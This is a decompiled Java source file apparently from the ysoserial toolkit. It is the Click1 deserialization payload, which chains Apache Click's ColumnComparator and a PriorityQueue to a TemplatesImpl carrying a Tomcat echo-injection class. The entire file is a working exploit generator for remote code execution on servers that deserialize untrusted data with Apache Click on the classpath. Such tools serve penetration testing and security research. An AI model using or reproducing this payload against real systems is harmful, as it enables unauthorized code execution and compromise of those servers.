//
// Source code recreated from a .class file by IntelliJ IDEA
// (powered by FernFlower decompiler)
//

package ysoserial.payloads;

import java.math.BigInteger;
import java.util.Comparator;
import java.util.PriorityQueue;
import org.apache.click.control.Column;
import org.apache.click.control.Table;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.Gadgets;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

@Dependencies({"org.apache.click:click-nodeps:2.3.0", "javax.servlet:javax.servlet-api:3.1.0"})
@Authors({"artsploit"})
public class Click1 implements ObjectPayload<Object> {
    public Click1() {
    }

    public Object getObject(String command) throws Exception {
        Column column = new Column("lowestSetBit");
        column.setTable(new Table());
        Comparator comparator = (Comparator)Reflections.newInstance("org.apache.click.control.Column$ColumnComparator", new Object[]{column});
        PriorityQueue<Object> queue = new PriorityQueue(2, comparator);
        queue.add(new BigInteger("1"));
        queue.add(new BigInteger("1"));
        column.setName("outputProperties");
        Object[] queueArray = (Object[])((Object[])Reflections.getFieldValue(queue, "queue"));
        Object templates = Gadgets.createTemplatesImpl(TomcatEchoInject.class);
        queueArray[0] = templates;
        return queue;
    }

    public static void main(String[] args) throws Exception {
        PayloadRunner.run(Click1.class, args);
    }
}
